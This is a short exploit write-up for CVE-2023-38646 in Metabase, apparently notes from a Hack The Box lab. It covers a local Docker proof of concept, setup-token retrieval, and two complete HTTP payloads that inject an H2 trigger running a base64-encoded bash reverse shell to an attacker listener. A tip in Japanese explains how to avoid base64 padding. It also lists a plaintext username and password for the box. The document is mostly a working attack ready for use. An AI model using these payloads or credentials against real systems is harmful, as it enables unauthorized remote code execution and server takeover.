
# CVE-2023-38646

## Summary
### User Credencial
|Key|Value|
|----|----|
|USER|metalytics|
|PASS|An4lytics_ds20223#|

## POC in local

### Run container 
```
docker run -d -p 3000:3000 --name metabase metabase/metabase:v0.46.6.
```

### Check access of HP
```
GET / HTTP/1.1
Host: localhost:3000
User-Agent: curl/8.12.1
Accept: */*
Connection: keep-alive


```

### Get setup-token
```
http://localhost:3000/api/session/properties
```

### 

### Prepare Reverse Shell
```
echo 'bash -i >&/dev/tcp/172.17.0.1/4444 0>&1  ' | base64
```

### Payload for Reverse Shell
```
POST /api/setup/validate HTTP/1.1
Host: localhost:3000
Content-Type: application/json
Content-Length: 816

{
    "token": "662282d5-531b-4468-b113-9d0a43bcac5c",
    "details":
    {
        "is_on_demand": false,
        "is_full_sync": false,
        "is_sample": false,
        "cache_ttl": null,
        "refingerprint": false,
        "auto_run_queries": true,
        "schedules":
        {},
        "details":
        {
            "db": "zip:/app/metabase.jar!/sample-database.db;MODE=MSSQLServer;TRACE_LEVEL_SYSTEM_OUT=1\\;CREATE TRIGGER pwnshell BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$//javascript\njava.lang.Runtime.getRuntime().exec('bash -c {echo,YmFzaCAtaSA+Ji9kZXYvdGNwLzE3Mi4xNy4wLjEvNDQ0NCAwPiYxICAK}|{base64,-d}|{bash,-i}')\n$$--=x",
            "advanced-options": false,
            "ssl": true
        },
        "name": "an-sec-research-team",
        "engine": "h2"
    }
}
```


## Exploit
### Check access of HP
```
GET / HTTP/1.1
Host: data.analytical.htb
User-Agent: curl/8.12.1
Accept: */*
Connection: keep-alive


```

### Payload for Reverse Shell
```
POST /api/setup/validate HTTP/1.1
Host: data.analytical.htb
Content-Type: application/json
Content-Length: 820

{
    "token": "249fa03d-fd94-4d5b-b94f-b4ebf3df681f",
    "details":
    {
        "is_on_demand": false,
        "is_full_sync": false,
        "is_sample": false,
        "cache_ttl": null,
        "refingerprint": false,
        "auto_run_queries": true,
        "schedules":
        {},
        "details":
        {
            "db": "zip:/app/metabase.jar!/sample-database.db;MODE=MSSQLServer;TRACE_LEVEL_SYSTEM_OUT=1\\;CREATE TRIGGER pwnshell BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$//javascript\njava.lang.Runtime.getRuntime().exec('bash -c {echo,YmFzaCAtaSA+Ji9kZXYvdGNwLzEwLjEwLjE0LjE0MC80NDQ0IDA+JjEg}|{base64,-d}|{bash,-i}')\n$$--=x",
            "advanced-options": false,
            "ssl": true
        },
        "name": "an-sec-research-team",
        "engine": "h2"
    }
}
```

## Point
- BASE64エンコーディングの結果、末尾が「=」or「==」になる場合、Exploitに失敗する。末尾が「=」にならないように、エンコード前の文字列の末尾に任意の個数のスペースを追加することで、文字数を調節する必要がある。


## Reference
https://www.assetnote.io/resources/research/chaining-our-way-to-pre-auth-rce-in-metabase-cve-2023-38646


